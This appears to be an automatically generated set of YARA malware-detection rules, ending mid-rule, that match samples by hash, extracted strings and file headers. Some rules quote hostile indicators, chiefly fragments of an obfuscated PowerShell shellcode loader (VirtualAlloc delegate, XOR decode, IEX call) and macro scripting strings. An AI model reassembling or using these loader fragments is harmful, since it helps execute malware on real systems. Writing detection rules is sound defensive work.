rule sig_5b4fa424c04f0c0b46e27d6d91726c5cb53f515fc6e039776879f4407502a0f9 {
   meta:
      description = "dataset - file 5b4fa424c04f0c0b46e27d6d91726c5cb53f515fc6e039776879f4407502a0f9"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "5b4fa424c04f0c0b46e27d6d91726c5cb53f515fc6e039776879f4407502a0f9"
   strings:
      $s1 = "f129.dll" fullword ascii /* score: '20.00'*/
      $s2 = "fdd64dbce16d75ab63556050d44949cb2b6dbb6a102d24655e0e6c2d9ba6747ed63f29d8cf435d48cdbebf430eadf46d5a4afa6b2405d4f513eb7a9a7568f016" ascii /* score: '11.00'*/
      $s3 = "d8cf9fe88f9aec7722fc3e597e3f207e0f2dd71f95e18ff454c8733a6c305d3710ed3e18fd35dc3745cc774dcc474f8623aae60feef60fe23bab5b35e582e033" ascii /* score: '11.00'*/
      $s4 = "a29bf416b3afb904227812d3a3531d2ce880c762496a96b5c5848683cb73344772d2612810ae450aade6e226fb73f717fc0445d8d95069a06ec4291a3c98dd88" ascii /* score: '11.00'*/
      $s5 = "a4fea39b6025195f5bb8f8942d0ec4f9ac00377e1e4aecdd1403a6626b99420a2c6169ee33bb3c5f65cf6fa06f497fd688b3f7d34d4748943a174b25ef6afe13" ascii /* score: '11.00'*/
      $s6 = "233bbbfbd28c546dc1b6bba373699a08ec89d58f4fff8f3ddd821f7c616f7883d4a1d137ac46e21a121f7c6e6de1b3bae3bf6678c4d5ba0c0ab6e5d93d2c3f4a" ascii /* score: '11.00'*/
      $s7 = "d579945c38e627ace8ebeff8cef2bfdbe66d07369144ce1e723fa3a50fde0b64a5fd3ed105e27b5fe790eafcbbbe642697a52311deff9e9144c68f7eb48a0e67" ascii /* score: '11.00'*/
      $s8 = "31a9d6126103ce3cbd41c68455a1bb3853e02da44aafe8ea42988ef8949bd541f8d8a42c76d2698d71ab1df21ae05f7786c2b10ad9a973acf023dd0abcb94457" ascii /* score: '11.00'*/
      $s9 = "73c72cfbc7b1fbb07b455fc2d07f126975eba142ab8d16779880f5d0357914e93359003f1a436decff11af9b3ec5b2e3ac8732bec3cbe5bf98a7cb741ece4127" ascii /* score: '11.00'*/
      $s10 = "4cf2b8cbdcb457f68ba858def0c3973c719ce02c67105c23d11bbb37ecf69bdd7722f1b14fa9432a34b72489942ba7b3fa7db93c993772588f77bb618311d19c" ascii /* score: '11.00'*/
      $s11 = "f0dd7ebdafa7e516edb9d50bbbb1492221972583e57df7284728bdadae0e06a24410ec61c5a4df9448373385afbb8b67eae488be5e0cb8ebe0059822a6bae80c" ascii /* score: '11.00'*/
      $s12 = "1e298fc5f4dc69a9fd6c9cc3126c219e34f8da30e606cb93fb52a8279bdbb4b433d3711ed5e4c91763151463fd692c48931a2658a67fe931c95637c5d485de81" ascii /* score: '11.00'*/
      $s13 = "20d6335c82b982c658b6cc9ab9126b147bed1feb3aed4f5debdac6a3b777dababd974a421a048e0473a52464166a0763d03dace3c4d331b04fec7d98f14c9930" ascii /* score: '11.00'*/
      $s14 = "786c85a67c46e9e70f06b68bfa3e3d1bdff8e6fb87cf2b8f6f39b87fe3a48176fa296d6f7fc4b82beabeff656be011f5e36d6e8d803b62ea84c179b5b34789da" ascii /* score: '11.00'*/
      $s15 = "1adcd02a74c63c5920f431e67a1e11a2139935e99d94f34c292df439ccc55f54d5447db12787e120b62f25455c5aa2f3d631c6596973251c36d2fd0874d2115a" ascii /* score: '11.00'*/
      $s16 = "9064a8941ea5599d2810add0f347f4ea8867777a00fd3d6e0a101891fccbb441bf35167ab69e18ea64e98cf4b91fe387f5701ff56fc6c6a3d22f04f8c1d1aab4" ascii /* score: '11.00'*/
      $s17 = "b98e4dea413fdc03683241b7398885be05db64ee2d57a13b12d165ab21d528e25fe6890c397d0a92031407dbb70efbaf5eba63c8c3e851f9d42d0775de6c1678" ascii /* score: '11.00'*/
      $s18 = "671cfdfa0a19b4fa7a25d227eac0a500616c64e74a0de0380fb745ee1c0139e5d9a5a3998e621a3e4319ea40f326c224a44792679f164c91da0c689dc48ccc3c" ascii /* score: '11.00'*/
      $s19 = "4188c3bb118a05a188f959c02130066fc27df19c9034b3ef04d4c904debd506cdc450adc4d79457f5c908f2afd761e0e7c0752c497ddd607cedf5c33023868d0" ascii /* score: '11.00'*/
      $s20 = "02f73313553506baa99e0d75dcc35c508de61efce03c531263acff3a4e7294fa1c7bc1c3832c93144a2e753e0c130daa97ee112a0729181dde893ea584f0e4e4" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule sig_2be8c5227ce43f5f92291200b651a468b8ee36ea00c7f1f7f0d7579a7de61b43 {
   meta:
      description = "dataset - file 2be8c5227ce43f5f92291200b651a468b8ee36ea00c7f1f7f0d7579a7de61b43"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "2be8c5227ce43f5f92291200b651a468b8ee36ea00c7f1f7f0d7579a7de61b43"
   strings:
      $s1 = "f58.dll" fullword ascii /* score: '20.00'*/
      $s2 = "189ba7384f63af48a936c30f7d11e6f7a44b74f47adaad956b726634067f5788f44410c52f4261f586e0f9bc2b96fe8e9956f38a27985e77fcdeb20cfda18cd1" ascii /* score: '11.00'*/
      $s3 = "737066180dc40ad813f1234fad606b46f6df18657ceaf31359986397ead55ba85f1abd20e381b18b21a725f5a6ed22e9a5bd6e709f1c1e20abbc47f904cefbe1" ascii /* score: '11.00'*/
      $s4 = "a84fc5bfc0da5ee55c221fc9e304663dc733c313d16ab19510a5e4b4ea77aaefcebd2a989b38e29b3f7fc3b30ba6faaa69f26352b0edf26cd1115fff391370e2" ascii /* score: '11.00'*/
      $s5 = "ae0440b54f14e47d123b9ec362eed3c70d6f8969f5fb84fb387609497d58df4e28a0380a7f0ccf3d3823bffa233d62f7a9ece550a76df84c8c13741167f2d037" ascii /* score: '11.00'*/
      $s6 = "51a1fa71f939e529c0d2af5a9f2bef941ddeb0bac3e755cdd7f71abaf2dd6beb4ad5bdec1809fc79c785f3dac7af2c58407d25fc3d35f5bdc31e9d959824d4e5" ascii /* score: '11.00'*/
      $s7 = "262027a1e95b36fc02107b5412e242b38d4c2a8cbf726d85b6339efeec39ead169db46c4649ae1355e87c96264a16f5e96d0b5f13a33504969544c662b44faa3" ascii /* score: '11.00'*/
      $s8 = "c6be59f50778d776a364805fbde570305de062f95eb2668b85bd2d9cdf66b764b4c5862bb4bcc50add778bc01b7f87cb35bb12ddac49fec6680af26dd82b155f" ascii /* score: '11.00'*/
      $s9 = "8c102e15767dc03d282e9b1dcbfc662b7585c29bf2ad828b437a6afeef58b69cc6066b199b0e44324323799c834176589f8e744646fe417f7343094b197cf122" ascii /* score: '11.00'*/
      $s10 = "c4c6f3fa7118334c93ef67e831c535c5d7c85121b37c7c0d7036dc4affa7a3408314a1b964b1afa89ed0384fe56015dbc6c3d3d1a4433ace35d7c9c2516f45a9" ascii /* score: '11.00'*/
      $s11 = "097cf974fceec2d3275a35edcdbaeef5f21bc5a488b1bbbc3612a455711d777da84e7fcfde4c2c78fa67c1ee16f3f5925517f72ec8cfdd7b0dd698f2b9226a3e" ascii /* score: '11.00'*/
      $s12 = "5e576a610e5be5e52c37c8a02533877f3b9880ebdc074cee17ab618403ae6951f3518a33747666dffcd07c45125d44ee56ceef77eb010f3d28271dc4021515cb" ascii /* score: '11.00'*/
      $s13 = "910fb978bb13086ec7fbf18abbb34d67a49ac3aa24bd41663ff38e2db23a4e49f34307de8dbad72acf5d258e3a5b18b29ea880cc7a2ffc7772ec63e7c696cea8" ascii /* score: '11.00'*/
      $s14 = "06c99c2c4dc581a9909d763ec63d8d17685729bdbd9b4abd55844f19e2b57f959bab0bc33d9b2dee196f94541092d887f43141771778c6f29b480dcbedc6f477" ascii /* score: '11.00'*/
      $s15 = "4872b99e34151711138598048865594829c9fcdb08c7da27406749253e416619cd0b295c07bec192bf19d0769ac5c3ab348c88ab44bd733c268e3f2b" ascii /* score: '11.00'*/
      $s16 = "1250224cdfe3e9119eb6f33483a7d7f174164f47f094f0f46e9e2ee769394ff378eae429e5e9f33c0df1f4699eaee5e9169e9ee5e9373c3dcfd343c2209adf05" ascii /* score: '11.00'*/
      $s17 = "43b87208ed7322eabebaf98c7e175286c8afeb5059eb1cc19b343695b8331b9974695f26e1c2f164735d900b5478b0a36dc0cf31a724af50c97669c0663162a0" ascii /* score: '11.00'*/
      $s18 = "278aaf7e8b943bbeb745136911ad8b683be7237398b36fdd6c6a785c6ac5b9db6f3606641c9ee9c1d1f1bdfbdaa7ef0f2f9855347cf54dcba7575dcb4410e0ec" ascii /* score: '11.00'*/
      $s19 = "4319f686e108d532ee3fb11985fd43fa0f7bd1730bfc8df4d81f73730bf35809963bc89f9fd8ef95546e5c3e74998df16cc9f0260c644b1984f59941edec7613" ascii /* score: '11.00'*/
      $s20 = "1a3cebe179099e95f0cc87a7001e0d3c0fc13342766bfc69784ec073189e0fe1d90dcf2678d6c0f3023c4be0298227079e49f0dc0fcf3df0f4c173e9fffd78c8" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule bb4fe58a0d6cbb1237d46f2952d762cc {
   meta:
      description = "dataset - file bb4fe58a0d6cbb1237d46f2952d762cc"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "56f3f593d4bf728840e00df5ba1a1fe1ffddf142a3e42dac6023c866d3670624"
   strings:
      $s1 = "        <requestedExecutionLevel level='asInvoker' uiAccess='false' />" fullword ascii /* score: '15.00'*/
      $s2 = "/login/member/center/logins" fullword wide /* score: '15.00'*/
      $s3 = "UBContent" fullword wide /* score: '9.00'*/
      $s4 = "Error %u in WinHttpSendRequest_." fullword ascii /* score: '7.00'*/
      $s5 = "pro.pro-pay.xyz" fullword wide /* score: '7.00'*/
      $s6 = "k4+kP+" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s7 = "CA< t(<#t" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s8 = ".CRT$XIAC" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s9 = "<utT@:" fullword ascii /* score: '1.00'*/
      $s10 = "!,X< w" fullword ascii /* score: '1.00'*/ /* Goodware String - occured 4 times */
      $s11 = "D+d$8H" fullword ascii /* score: '1.00'*/
      $s12 = "<g~{<itd<ntY<ot7<pt" fullword ascii /* score: '1.00'*/
      $s13 = "D8T8>t" fullword ascii /* score: '1.00'*/
      $s14 = "<StW@:" fullword ascii /* score: '1.00'*/
      $s15 = "#D8d$`t" fullword ascii /* score: '1.00'*/
      $s16 = "D<P0@:" fullword ascii /* score: '1.00'*/
      $s17 = "<Ct-<D" fullword ascii /* score: '1.00'*/
      $s18 = "<htl<jt\\<lt4<tt$<wt" fullword ascii /* score: '1.00'*/
      $s19 = "u0HcH<H" fullword ascii /* score: '1.00'*/
      $s20 = "fE9xHvaM" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and
      8 of them
}

rule ee44c0692fd2ab2f01d17ca4b58ca6c7f79388cbc681f885bb17ec946514088c {
   meta:
      description = "dataset - file ee44c0692fd2ab2f01d17ca4b58ca6c7f79388cbc681f885bb17ec946514088c"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "ee44c0692fd2ab2f01d17ca4b58ca6c7f79388cbc681f885bb17ec946514088c"
   strings:
      $s1 = "HAAAAAAAA" fullword ascii /* base64 encoded string '      ' */ /* reversed goodware string 'AAAAAAAAH' */ /* score: '26.50'*/
      $s2 = "C:\\Users\\dev\\Desktop\\" fullword ascii /* score: '24.00'*/
      $s3 = "Dll6.dll" fullword ascii /* score: '20.00'*/
      $s4 = "\\Dll6\\x64\\Release\\Dll6.pdb" fullword ascii /* score: '19.00'*/
      $s5 = "Attempted to free unknown block %p at %s:%d" fullword ascii /* score: '16.50'*/
      $s6 = "Attempted to realloc unknown block %p at %s:%d" fullword ascii /* score: '16.50'*/
      $s7 = "Attempted to realloc %d-byte block %p at %s:%d previously freed/realloced at %s:%d" fullword ascii /* score: '16.50'*/
      $s8 = "Attempted to free %d-byte block %p at %s:%d previously freed/realloced at %s:%d" fullword ascii /* score: '16.50'*/
      $s9 = "invalid decoded scanline length" fullword ascii /* score: '16.00'*/
      $s10 = "stb.log" fullword ascii /* score: '16.00'*/
      $s11 = "        <requestedExecutionLevel level='asInvoker' uiAccess='false' />" fullword ascii /* score: '15.00'*/
      $s12 = "Changed: %s - %08x:%08x" fullword ascii /* score: '15.00'*/
      $s13 = "s%s% :s%" fullword ascii /* reversed goodware string '%s: %s%s' */ /* score: '15.00'*/
      $s14 = "Eyedropped tile that isn't in tileset" fullword ascii /* score: '11.00'*/
      $s15 = "bad zlib header" fullword ascii /* score: '11.00'*/
      $s16 = "%s/%s.cfg" fullword ascii /* score: '11.00'*/
      $s17 = "no header height" fullword ascii /* score: '11.00'*/
      $s18 = "bad Image Descriptor" fullword ascii /* score: '10.00'*/
      $s19 = "tnld.lld" fullword ascii /* score: '10.00'*/
      $s20 = "Checked %d-byte block %p previously freed/realloced at %s:%d" fullword ascii /* score: '9.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      8 of them
}

rule sig_080ee6c068e95db7a776793e167fb4bb9ad0efcb424a400ed3efe697400fc73a {
   meta:
      description = "dataset - file 080ee6c068e95db7a776793e167fb4bb9ad0efcb424a400ed3efe697400fc73a"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "080ee6c068e95db7a776793e167fb4bb9ad0efcb424a400ed3efe697400fc73a"
   strings:
      $s1 = "ehttp://pki-crl.symauth.com/offlineca/TheInstituteofElectricalandElectronicsEngineersIncIEEERootCA.crl0" fullword ascii /* score: '19.00'*/
      $s2 = "Lhttp://pki-crl.symauth.com/ca_d409a5cb737dc0768fd08ed5256f3633/LatestCRL.crl07" fullword ascii /* score: '16.00'*/
      $s3 = "(Symantec SHA256 TimeStamping Signer - G3" fullword ascii /* score: '15.00'*/
      $s4 = "(Symantec SHA256 TimeStamping Signer - G30" fullword ascii /* score: '15.00'*/
      $s5 = "http://pki-ocsp.symauth.com0" fullword ascii /* score: '13.00'*/
      $s6 = "# -5l[\"." fullword ascii /* score: '9.00'*/
      $s7 = "Oreans Technologies0" fullword ascii /* score: '9.00'*/
      $s8 = ">U|%S%" fullword ascii /* score: '8.00'*/
      $s9 = "bugycseck" fullword ascii /* score: '8.00'*/
      $s10 = "skipact" fullword ascii /* score: '8.00'*/
      $s11 = "@|c:\\mirn" fullword ascii /* score: '7.00'*/
      $s12 = ".imports" fullword ascii /* score: '7.00'*/
      $s13 = "F:\"`F*t" fullword ascii /* score: '7.00'*/
      $s14 = "xrW:\"A" fullword ascii /* score: '7.00'*/
      $s15 = "XSQRVWUH" fullword ascii /* score: '6.50'*/
      $s16 = "XJ -!0" fullword ascii /* score: '5.00'*/
      $s17 = ",/+ b``" fullword ascii /* score: '5.00'*/
      $s18 = "28* NH." fullword ascii /* score: '5.00'*/
      $s19 = ") -g/'" fullword ascii /* score: '5.00'*/
      $s20 = "]E+%tO%e" fullword ascii /* score: '5.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      8 of them
}

rule b1b01e971e60a4fa4b8b6b46861eda6ace5d0483136b3d1a45bcb2ebeda96174 {
   meta:
      description = "dataset - file b1b01e971e60a4fa4b8b6b46861eda6ace5d0483136b3d1a45bcb2ebeda96174"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "b1b01e971e60a4fa4b8b6b46861eda6ace5d0483136b3d1a45bcb2ebeda96174"
   strings:
      $s1 = "AVGDll.dll" fullword ascii /* score: '23.00'*/
      $s2 = "read failed:%d" fullword ascii /* score: '10.00'*/
      $s3 = "read file success" fullword ascii /* score: '9.00'*/
      $s4 = "Qc.cfg" fullword wide /* score: '8.00'*/
      $s5 = "open file success" fullword ascii /* score: '6.00'*/
      $s6 = ";0?0C0G0K0O0S0W0" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s7 = "create file fialed:%d" fullword ascii /* score: '4.00'*/
      $s8 = "QQSVj8j@" fullword ascii /* score: '4.00'*/
      $s9 = "9,9Z9c9" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s10 = "l0Nt4GG2EGLcklsHmh" fullword ascii /* score: '4.00'*/
      $s11 = "URPQQhp#" fullword ascii /* score: '4.00'*/
      $s12 = "0O1S1W1[1_1c1g1k1" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s13 = "LowIntegrityServer" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s14 = "3 3'343" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s15 = "5'5O5c5" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s16 = ";!;3;E;W;i;{;" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s17 = "read file failed" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s18 = "2*2B2]2h2" fullword ascii /* score: '1.00'*/
      $s19 = "9\":6:;:@:[:e:u:z:" fullword ascii /* score: '1.00'*/
      $s20 = ">(>:>D>h>" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      8 of them
}

rule sig_064924bf49bd1809d90df0169eb6e354ce8f5b88100bb39b89460c480121fbeb {
   meta:
      description = "dataset - file 064924bf49bd1809d90df0169eb6e354ce8f5b88100bb39b89460c480121fbeb"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "064924bf49bd1809d90df0169eb6e354ce8f5b88100bb39b89460c480121fbeb"
   strings:
      $s1 = "tZSZz8w" fullword ascii /* score: '4.00'*/
      $s2 = "*o!~mLBsXeW)" fullword ascii /* score: '4.00'*/
      $s3 = "UgXD8!3F" fullword ascii /* score: '4.00'*/
      $s4 = "BZsPBx\"$" fullword ascii /* score: '4.00'*/
      $s5 = ")qPtq(^r\\" fullword ascii /* score: '4.00'*/
      $s6 = "DltG:*a" fullword ascii /* score: '4.00'*/
      $s7 = "aPJv,2m" fullword ascii /* score: '4.00'*/
      $s8 = "(qPtq(^r]h" fullword ascii /* score: '4.00'*/
      $s9 = "(qPCw/Pau" fullword ascii /* score: '4.00'*/
      $s10 = "zVsPzBp" fullword ascii /* score: '4.00'*/
      $s11 = "VsPOw/R" fullword ascii /* score: '4.00'*/
      $s12 = "\\y,E(q" fullword ascii /* score: '2.00'*/
      $s13 = "\\xXE,1X" fullword ascii /* score: '2.00'*/
      $s14 = "\\dPGBs" fullword ascii /* score: '2.00'*/
      $s15 = "\\l_D\\hXB," fullword ascii /* score: '2.00'*/
      $s16 = "\\t3skq" fullword ascii /* score: '2.00'*/
      $s17 = "\\Z_D\\^,B+q" fullword ascii /* score: '2.00'*/
      $s18 = "\\y,E(u" fullword ascii /* score: '2.00'*/
      $s19 = "pXC)K<" fullword ascii /* score: '1.00'*/
      $s20 = "$Phy P" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      8 of them
}

rule c7317b64a4f541d3e7eb3d60afede57e02414322b72ad778399c2a5adcff9751 {
   meta:
      description = "dataset - file c7317b64a4f541d3e7eb3d60afede57e02414322b72ad778399c2a5adcff9751"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "c7317b64a4f541d3e7eb3d60afede57e02414322b72ad778399c2a5adcff9751"
   strings:
      $s1 = "$VPS = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Kkdd kernel32.dll VirtualAlloc), (l @([IntPtr], " ascii /* score: '27.00'*/
      $s2 = "$VPS = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Kkdd kernel32.dll VirtualAlloc), (l @([IntPtr], " ascii /* score: '27.00'*/
      $s3 = "$p = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equa" ascii /* score: '24.00'*/
      $s4 = "('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')" fullword ascii /* score: '24.00'*/
      $s5 = "return $yDE.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-" ascii /* score: '15.00'*/
      $s6 = "$IVc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($eX, (l @([IntPtr]) ([Void])))" fullword ascii /* score: '15.00'*/
      $s7 = "Set-StrictMode -Version 2" fullword ascii /* score: '11.00'*/
      $s8 = "$yDE = $p.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))" fullword ascii /* score: '11.00'*/
      $s9 = "start-job { param($a) I`eX $a } -RunAs32 -Argument $mMi | wait-job | Receive-Job" fullword ascii /* score: '11.00'*/
      $s10 = "return $yDE.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-" ascii /* score: '10.00'*/
      $s11 = "[System.Runtime.InteropServices.Marshal]::Copy($EtGkl, 0, $eX, $EtGkl.length)" fullword ascii /* score: '10.00'*/
      $s12 = "$emb.DefineMethod('Invo'+'ke', 'Public, HideBySig, NewSlot, Virtual', $TRung, $u).SetImplementationFlags('Runtime, Managed')" fullword ascii /* score: '10.00'*/
      $s13 = "$p = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equa" ascii /* score: '9.00'*/
      $s14 = "Object IntPtr), ($p.GetMethod('GetModuleHandle')).Invoke($null, @($JS)))), $lWyu))" fullword ascii /* score: '9.00'*/
      $s15 = "for ($x = 0; $x -lt $EtGkl.Count; $x++) {" fullword ascii /* score: '8.00'*/
      $s16 = "If ([IntPtr]::size -eq 8) {" fullword ascii /* score: '8.00'*/
      $s17 = "$EtGkl[$x] = $EtGkl[$x] -bxor 35" fullword ascii /* score: '8.00'*/
      $s18 = "onFlags('Runtime, Managed')" fullword ascii /* score: '7.00'*/
      $s19 = "[Parameter(Position = 1)] [Type] $TRung = [Void]" fullword ascii /* score: '7.00'*/
      $s20 = "$emb.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $u).SetImplementati" ascii /* score: '6.00'*/
   condition:
      uint16(0) == 0x6553 and filesize < 10KB and
      8 of them
}

rule d90514c5b26e568a6d51eec779bd3bea328b890efc00aa179f8edd617754a802 {
   meta:
      description = "dataset - file d90514c5b26e568a6d51eec779bd3bea328b890efc00aa179f8edd617754a802"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "d90514c5b26e568a6d51eec779bd3bea328b890efc00aa179f8edd617754a802"
   strings:
      $s1 = "abcdefghijklmnop" fullword ascii /* score: '8.00'*/
      $s2 = "abcdbcdecdefdef" ascii /* score: '8.00'*/
      $s3 = "ksysnative" fullword ascii /* score: '8.00'*/
      $s4 = "cOMG@ZA]F" fullword ascii /* score: '7.00'*/
      $s5 = "%s as %s\\%s: %d" fullword ascii /* score: '6.50'*/
      $s6 = "BBBBBBBBH" fullword ascii /* score: '6.50'*/
      $s7 = "+ w<<H" fullword ascii /* score: '5.00'*/
      $s8 = "+ 1<<F" fullword ascii /* score: '5.00'*/
      $s9 = "s+- <<F" fullword ascii /* score: '5.00'*/
      $s10 = "rijndael" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.99'*/ /* Goodware String - occured 6 times */
      $s11 = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.98'*/ /* Goodware String - occured 21 times */
      $s12 = "Microsoft Base Cryptographic Provider v1.0" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.85'*/ /* Goodware String - occured 148 times */
      $s13 = "sha256" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.85'*/ /* Goodware String - occured 153 times */
      $s14 = "process" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.83'*/ /* Goodware String - occured 171 times */
      $s15 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.10'*/ /* Goodware String - occured 903 times */
      $s16 = "]OHKL\\AY]G@I" fullword ascii /* score: '4.00'*/
      $s17 = "erhY-\"S" fullword ascii /* score: '4.00'*/
      $s18 = "%s&%s=%s" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s19 = "%02d/%02d/%02d %02d:%02d:%02d" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s20 = "r]W]@OZGXKrI^[^JOZK" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      8 of them
}

rule sig_9d35e17421e9a1c8458f32cd813bd27f {
   meta:
      description = "dataset - file 9d35e17421e9a1c8458f32cd813bd27f"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "910e449d025890cc10c331f41de133f6865bb8fbe66facafec461b121e9aef1d"
   strings:
      $s1 = "*\\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.4#0#C:\\Program Files\\Common Files\\Microsoft Shared\\OFFICE12\\MSO.DLL#Microsoft " wide /* score: '28.00'*/
      $s2 = "*\\G{000204EF-0000-0000-C000-000000000046}#4.0#9#C:\\PROGRA~1\\COMMON~1\\MICROS~1\\VBA\\VBA6\\VBE6.DLL#Visual Basic For Applicat" wide /* score: '21.00'*/
      $s3 = "*\\G{00020430-0000-0000-C000-000000000046}#2.0#0#C:\\Windows\\system32\\stdole2.tlb#OLE Automation" fullword wide /* score: '21.00'*/
      $s4 = "Wscript.Shell" fullword ascii /* PEStudio Blacklist: strings */ /* score: '20.00'*/
      $s5 = "baaaaaaa" ascii /* reversed goodware string 'aaaaaaab' */ /* score: '18.00'*/
      $s6 = "sam@edibleupcountry.com" fullword ascii /* score: '18.00'*/
      $s7 = "*\\G{00020813-0000-0000-C000-000000000046}#1.6#0#C:\\Program Files\\Microsoft Office\\Office12\\EXCEL.EXE#Microsoft Excel 12.0 O" wide /* score: '17.00'*/
      $s8 = "HDDDDDDDDD" fullword ascii /* reversed goodware string 'DDDDDDDDDH' */ /* score: '16.50'*/
      $s9 = "MDDDDDDDDDD" fullword ascii /* reversed goodware string 'DDDDDDDDDDM' */ /* score: '16.50'*/
      $s10 = "DDDDDDDDDDDT" fullword ascii /* reversed goodware string 'TDDDDDDDDDDD' */ /* score: '16.50'*/
      $s11 = "ADDDDDDDDDDDDD" ascii /* reversed goodware string 'DDDDDDDDDDDDDA' */ /* score: '16.50'*/
      $s12 = "LDDDDDDDDDD" fullword ascii /* reversed goodware string 'DDDDDDDDDDL' */ /* score: '16.50'*/
      $s13 = "LDDDDDDDDD" fullword ascii /* reversed goodware string 'DDDDDDDDDL' */ /* score: '16.50'*/
      $s14 = "!!!>>>" fullword ascii /* reversed goodware string '>>>!!!' */ /* score: '16.00'*/
      $s15 = "Execzy" fullword ascii /* score: '15.00'*/
      $s16 = "LUSERSPR" fullword ascii /* score: '14.50'*/
      $s17 = "@DDDDDDDD" fullword ascii /* reversed goodware string 'DDDDDDDD@' */ /* score: '14.00'*/
      $s18 = "Scripting.FileSystemObject$" fullword ascii /* score: '13.00'*/
      $s19 = "DocumentUserPassword" fullword wide /* score: '12.00'*/
      $s20 = "DocumentOwnerPassword" fullword wide /* score: '12.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 2000KB and
      8 of them
}

rule PointerScope_Understanding_Pointer_Patching_for_Code_Randomization {
   meta:
      description = "dataset - file PointerScope_Understanding_Pointer_Patching_for_Code_Randomization.pdf"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "e77e212d2614a410cda2d1cdf2f7fa2aced0969faaba964a40f514fa70e4f72c"
   strings:
      $s1 = "/Creator (PScript5.dll Version 5.2.2)" fullword ascii /* score: '25.00'*/
      $s2 = "<rdf:Description rdf:about=\"\" xmlns:dc=\"http://purl.org/dc/elements/1.1/\"><dc:format>application/pdf</dc:format><dc:publishe" ascii /* score: '20.00'*/
      $s3 = "  xmlns:pdf='http://ns.adobe.com/pdf/1.3/'>" fullword ascii /* score: '17.00'*/
      $s4 = "  xmlns:xapMM='http://ns.adobe.com/xap/1.0/mm/'>" fullword ascii /* score: '17.00'*/
      $s5 = "  xmlns:xap='http://ns.adobe.com/xap/1.0/'>" fullword ascii /* score: '17.00'*/
      $s6 = "  xmlns:exif='http://ns.adobe.com/exif/1.0/'>" fullword ascii /* score: '17.00'*/
      $s7 = "  xmlns:photoshop='http://ns.adobe.com/photoshop/1.0/'>" fullword ascii /* score: '17.00'*/
      $s8 = "  xmlns:tiff='http://ns.adobe.com/tiff/1.0/'>" fullword ascii /* score: '17.00'*/
      $s9 = "ADDDDDDDDDDD" ascii /* reversed goodware string 'DDDDDDDDDDDA' */ /* score: '16.50'*/
      $s10 = "<rdf:Description rdf:about=\"\" xmlns:jav=\"http://www.niso.org/schemas/jav/1.0/\"><jav:journal_article_version>VoR</jav:journal" ascii /* score: '16.00'*/
      $s11 = "<rdf:Description rdf:about=\"\" xmlns:jav=\"http://www.niso.org/schemas/jav/1.0/\"><jav:journal_article_version>VoR</jav:journal" ascii /* score: '16.00'*/
